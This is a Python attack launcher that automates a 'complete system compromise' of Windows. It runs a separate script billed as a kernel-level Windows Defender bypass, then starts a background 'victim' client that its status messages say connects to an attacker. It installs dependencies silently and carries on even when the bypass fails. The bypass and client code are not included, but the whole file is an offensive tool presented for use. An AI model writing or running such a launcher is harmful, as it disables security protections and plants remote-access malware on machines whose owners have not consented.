#!/usr/bin/env python3
"""
MAIN EXECUTION SCRIPT - KERNEL BYPASS + VICTIM DEPLOYMENT
Automated execution sequence for complete system compromise
"""

import subprocess
import os
import sys
import time
import platform

def check_admin():
    """Check for administrator privileges"""
    if platform.system() == 'Windows':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        return os.geteuid() == 0

def run_defender_bypass():
    """Execute Windows Defender bypass script"""
    print("[+] STAGE 1: Executing Windows Defender Kernel-Level Bypass")
    
    if not os.path.exists("win_def_bp.py"):
        print("[!] win_def_bp.py not found in current directory")
        return False
    
    try:
        # Run bypass script
        result = subprocess.run(
            [sys.executable, "win_def_bp.py"],
            capture_output=True,
            text=True,
            timeout=180  # 3 minute timeout for complete bypass
        )
        
        print(f"[+] Bypass script completed with return code: {result.returncode}")
        
        if result.returncode == 0 or "DISABLED" in result.stdout:
            print("[✓] Windows Defender bypass successful")
            return True
        else:
            print("[!] Bypass script may have encountered issues")
            print(f"Output:\n{result.stdout[:500]}...")
            return False
            
    except subprocess.TimeoutExpired:
        print("[!] Bypass script timed out - continuing anyway")
        return True
    except Exception as e:
        print(f"[!] Error running bypass script: {e}")
        return False

def run_victim_client():
    """Execute victim client"""
    print("\n[+] STAGE 2: Launching Quantum Victim Client")
    
    if not os.path.exists("victim.py"):
        print("[!] victim.py not found in current directory")
        return False
    
    try:
        # Run victim client in background
        victim_process = subprocess.Popen(
            [sys.executable, "victim.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"[✓] Victim client launched with PID: {victim_process.pid}")
        
        # Wait a moment to see if it starts successfully
        time.sleep(3)
        
        if victim_process.poll() is None:
            print("[✓] Victim client running in background")
            return True
        else:
            print("[!] Victim client terminated immediately")
            stdout, stderr = victim_process.communicate()
            print(f"Output:\n{stdout[:300]}")
            if stderr:
                print(f"Errors:\n{stderr[:300]}")
            return False
            
    except Exception as e:
        print(f"[!] Error launching victim client: {e}")
        return False

def install_dependencies():
    """Install required Python packages"""
    print("[+] Checking and installing dependencies...")
    
    packages = ["psutil", "pycryptodome"]
    
    for package in packages:
        try:
            __import__(package.replace("-", "_"))
            print(f"[✓] {package} already installed")
        except ImportError:
            print(f"[+] Installing {package}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"[✓] {package} installed successfully")
            except:
                print(f"[!] Failed to install {package}")
                # Continue anyway - scripts have fallback mechanisms

def main():
    """Main execution sequence"""
    print("\n" + "=" * 80)
    print("         AUTOMATED COMPROMISE SEQUENCE - KERNEL TO VICTIM")
    print("=" * 80)
    
    # Check platform
    if platform.system() != "Windows":
        print("[!] This sequence is designed for Windows systems only")
        print("[!] Some components may not function correctly")
        confirm = input("[?] Continue anyway? (y/N): ").lower()
        if confirm != 'y':
            return
    
    # Check admin privileges for bypass stage
    if not check_admin():
        print("[!] Administrator privileges required for full bypass")
        print("[!] Running with limited permissions - bypass may be incomplete")
    
    # Install dependencies
    install_dependencies()
    
    # Execute Stage 1: Defender Bypass
    print("\n" + "=" * 80)
    print("STAGE 1: WINDOWS DEFENDER KERNEL-LEVEL DISABLE")
    print("=" * 80)
    
    bypass_success = run_defender_bypass()
    
    if not bypass_success:
        print("[!] Defender bypass encountered issues")
        print("[!] Continuing with victim deployment anyway...")
    
    # Wait for system to stabilize
    print("\n[+] Waiting for system changes to take effect...")
    time.sleep(5)
    
    # Execute Stage 2: Victim Client
    print("\n" + "=" * 80)
    print("STAGE 2: QUANTUM VICTIM CLIENT DEPLOYMENT")
    print("=" * 80)
    
    victim_success = run_victim_client()
    
    # Final status
    print("\n" + "=" * 80)
    print("                      EXECUTION SUMMARY")
    print("=" * 80)
    
    if bypass_success and victim_success:
        print("[✓] COMPLETE COMPROMISE SEQUENCE SUCCESSFUL")
        print("[✓] Windows Defender disabled at kernel level")
        print("[✓] Quantum Victim client deployed and running")
        print("[✓] System is now fully compromised and connecting to attacker")
    elif victim_success:
        print("[⚠️] PARTIAL SUCCESS")
        print("[✓] Victim client deployed and running")
        print("[!] Defender bypass may be incomplete")
        print("[+] System compromise achieved with possible restrictions")
    else:
        print("[✗] EXECUTION FAILED")
        print("[!] Critical components failed to execute")
        print("[!] Manual intervention may be required")
    
    print("\n[+] Script execution complete")
    print("[+] Press Ctrl+C to terminate victim client if needed")
    
    # Keep main process alive to monitor
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Manual termination requested")
        print("[+] Exiting...")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Fatal error in main execution: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
